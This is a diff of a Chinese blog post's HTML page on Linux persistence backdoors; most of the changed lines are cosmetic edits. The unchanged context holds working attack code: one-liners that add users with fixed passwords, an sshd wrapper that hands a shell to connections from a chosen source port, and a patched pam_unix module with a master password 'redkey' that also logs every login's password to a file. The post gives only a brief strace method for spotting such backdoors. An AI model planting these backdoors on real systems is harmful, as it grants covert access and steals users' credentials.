@@ -58,10 +58,11 @@
 <meta property="og:image" content="https://i.loli.net/2020/03/12/6Q8G2VTvxSw1Fgy.png">
 <meta property="og:image" content="https://i.loli.net/2020/03/12/JjX84xgStcrbnPh.png">
 <meta property="og:image" content="https://i.loli.net/2020/03/12/HhBMeiDFa7sdZ8k.png">
+<meta property="og:image" content="https://i.loli.net/2020/03/12/uOxWk9Zl1g4GjyN.png">
 <meta property="og:image" content="https://i.loli.net/2020/03/12/Myk4pwdoZcBPN6X.png">
 <meta property="og:image" content="https://i.loli.net/2020/03/12/oBaFQP8em2j5OyE.png">
 <meta property="article:published_time" content="2020-03-12T01:29:56.000Z">
-<meta property="article:modified_time" content="2020-03-12T11:46:15.336Z">
+<meta property="article:modified_time" content="2020-03-12T12:43:47.241Z">
 <meta property="article:author" content="glotozz">
 <meta property="article:tag" content="Linux">
 <meta name="twitter:card" content="summary">
@@ -180,7 +181,7 @@
 <!-- tocstop -->
 
 <hr>
-<p>看了篇文章觉得还不错。本着实践出真知的原理，自己动手操作下</p>
+<p>看了篇文章觉得还不错。本着实践出真知的精神，自己动手操作下</p>
 <hr>
 <h4><span id="1-一句话添加用户和密码">1、一句话添加用户和密码</span></h4><p><strong>添加普通用户</strong></p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"># 创建一个用户名guest，密码123456的普通用户</span><br><span class="line">useradd -p &#96;openssl passwd -1 -salt &#39;salt&#39; 123456&#96; guest</span><br><span class="line"></span><br><span class="line"># useradd -p 方法  &#96; &#96; 是用来存放可执行的系统命令,&quot;$()&quot;也可以存放命令执行语句</span><br><span class="line">useradd -p &quot;$(openssl passwd -1 123456)&quot; guest</span><br><span class="line"></span><br><span class="line"># chpasswd方法</span><br><span class="line">useradd guest;echo &#39;guest:123456&#39;|chpasswd</span><br><span class="line"></span><br><span class="line"># echo -e方法，-e：激活转义字符。</span><br><span class="line"># 使用-e选项时，若字符串中出现以下字符，则特别加以处理，而不会将它当成一般文字输出</span><br><span class="line">useradd test;echo -e &quot;123456\n123456\n&quot; |passwd test</span><br></pre></td></tr></table></figure>
@@ -239,7 +240,7 @@
 <p><img src="https://i.loli.net/2020/03/12/7gX2WIctYZam8Gz.png" alt="Snipaste_2020-03-12_14-46-39.png"></p>
 <hr>
 <h4><span id="5-ssh-wrapper">5、SSH wrapper</span></h4><blockquote>
-<p>init首先启动的是/usr/sbin/sshd,脚本执行到getpeername这里的时候，正则匹配会失败，于是执行下一句，启动/usr/bin/sshd，这是原始sshd。原始的sshd监听端口建立了tcp连接后，会fork一个子进程处理具体工作。这个子进程，没有什么检验，而是直接执行系统默认的位置的/usr/sbin/sshd，这样子控制权又回到脚本了。此时子进程标准输入输出已被重定向到套接字，getpeername能真的获取到客户端的TCP源端口，如果是19526就执行sh给个shell。 </p>
+<p>init首先启动的是<code>/usr/sbin/sshd</code>,脚本执行到getpeername这里的时候，正则匹配会失败，于是执行下一句，启动<code>/usr/bin/sshd</code>，这是原始sshd。原始的sshd监听端口建立了tcp连接后，会fork一个子进程处理具体工作。这个子进程，没有什么检验，而是直接执行系统默认的位置的<code>/usr/sbin/sshd</code>，这样子控制权又回到脚本了。此时子进程标准输入输出已被重定向到套接字，getpeername能真的获取到客户端的TCP源端口，如果是19526就执行sh给个shell。 </p>
 </blockquote>
 <p>服务端</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">cd &#x2F;usr&#x2F;sbin&#x2F;</span><br><span class="line">mv sshd ..&#x2F;bin&#x2F;</span><br><span class="line">echo &#39;#!&#x2F;usr&#x2F;bin&#x2F;perl&#39; &gt;sshd</span><br><span class="line">echo &#39;exec &quot;&#x2F;bin&#x2F;sh&quot; if(getpeername(STDIN) &#x3D;~ &#x2F;^..4A&#x2F;);&#39; &gt;&gt;sshd</span><br><span class="line">echo &#39;exec&#123;&quot;&#x2F;usr&#x2F;bin&#x2F;sshd&quot;&#125; &quot;&#x2F;usr&#x2F;sbin&#x2F;sshd&quot;,@ARGV,&#39; &gt;&gt;sshd</span><br><span class="line">chmod u+x sshd</span><br><span class="line">#ubuntu</span><br><span class="line">&#x2F;etc&#x2F;init.d&#x2F;sshd restart</span><br></pre></td></tr></table></figure>
@@ -295,7 +296,7 @@
 <p>成功，<code>ilog</code>中记录了本机登录的账号密码，<code>olog</code>中记录了本机登录其他机器的明文密码</p>
 <p><img src="https://i.loli.net/2020/03/12/FEdHx7f4RDjJ8ve.png" alt="Snipaste_2020-03-12_16-47-09.png"></p>
 <p><strong>排查技巧</strong></p>
-<p>利用strace找出ssh后门</p>
+<p>利用<code>strace</code>找出ssh后门</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># 1、获取可疑进程PI</span><br><span class="line">ps aux | grep sshd</span><br><span class="line"># 2、跟踪sshd PID</span><br><span class="line">strace -o aa -ff -p  PID</span><br><span class="line"># 3、查看记录密码打开文件</span><br><span class="line">grep open sshd* | grep -v -e No -e  null -e denied| grep  WR</span><br></pre></td></tr></table></figure>
 
 <p><img src="https://i.loli.net/2020/03/12/8Hc1IQADjoKEtW6.png" alt="Snipaste_2020-03-12_16-51-43.png"></p>
@@ -313,19 +314,22 @@
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">tar -xvf Linux-PAM-1.1.8.tar.gz</span><br><span class="line">cd Linux-PAM-1.1.8</span><br><span class="line">cd modules&#x2F;pam_unix&#x2F;</span><br><span class="line">vi pam_unix_auth.c</span><br></pre></td></tr></table></figure>
 
 <p>106行添加<code>FILE *fp;</code></p>
-<p><img src="https://i.loli.net/2020/03/12/JjX84xgStcrbnPh.png" alt="Snipaste_2020-03-12_17-13-43.png">在177行添加</p>
+<p><img src="https://i.loli.net/2020/03/12/JjX84xgStcrbnPh.png" alt="Snipaste_2020-03-12_17-13-43.png"></p>
+<p>在177行添加</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;*password:&quot;redkey&quot;*&#x2F;</span><br><span class="line">if(strcmp(p,&quot;redkey&quot;)&#x3D;&#x3D;0)</span><br><span class="line">&#123;</span><br><span class="line">        retval &#x3D; PAM_SUCCESS;</span><br><span class="line">&#125;</span><br><span class="line">if(retval&#x3D;&#x3D; PAM_SUCCESS)</span><br><span class="line">&#123;</span><br><span class="line">&#x2F;*pamfile:pamwd.txt*&#x2F;</span><br><span class="line">        fp&#x3D;fopen(&quot;pamwd.txt&quot;,&quot;a&quot;);</span><br><span class="line">        fprintf(fp,&quot;%s::%s\n&quot;,name,p);</span><br><span class="line">        fclose(fp);</span><br><span class="line">&#125;</span><br><span class="line">        name &#x3D; p &#x3D; NULL;</span><br><span class="line"></span><br><span class="line">        AUTH_RETURN;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 <p><img src="https://i.loli.net/2020/03/12/HhBMeiDFa7sdZ8k.png" alt="Snipaste_2020-03-12_17-03-59.png"></p>
 <p>编译</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd ..&#x2F;..&#x2F;</span><br><span class="line">.&#x2F;configure</span><br><span class="line">make</span><br></pre></td></tr></table></figure>
 
+<p>会根据不同情况调用<code>pam_unix.so</code></p>
+<p><img src="https://i.loli.net/2020/03/12/uOxWk9Zl1g4GjyN.png" alt="Snipaste_2020-03-12_20-04-36.png"></p>
 <p>备份原有PAM模块</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">find &#x2F; -name pam_unix.so</span><br><span class="line">&#x2F;usr&#x2F;lib64&#x2F;security&#x2F;pam_unix.so</span><br></pre></td></tr></table></figure>
 
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd &#x2F;usr&#x2F;lib64&#x2F;security&#x2F;pam_unix.so</span><br><span class="line">mv pam_unix.so&#123;,.bak&#125;</span><br></pre></td></tr></table></figure>
 
-<p> 复制新PAM模块到/lib64/security/目录下：</p>
+<p> 复制新PAM模块到<code>/usr/lib64/security/</code>目录下：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cp &#x2F;root&#x2F;Linux-PAM-1.1.8&#x2F;modules&#x2F;pam_unix&#x2F;.libs&#x2F;pam_unix.so &#x2F;usr&#x2F;lib64&#x2F;security&#x2F;</span><br></pre></td></tr></table></figure>
 
 <p>修改pam模块时间属性</p>
@@ -391,6 +395,12 @@
         
         
   <nav class="post-nav">
+    
+      <a class="prev" href="/2020/03/13/SQLMAP-temper%E7%BC%96%E5%86%99/">
+        <i class="iconfont icon-left"></i>
+        <span class="prev-text nav-default">SQLMAP-temper编写</span>
+        <span class="prev-text nav-mobile">Prev</span>
+      </a>
     
     
       <a class="next" href="/2020/03/08/%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9B/">
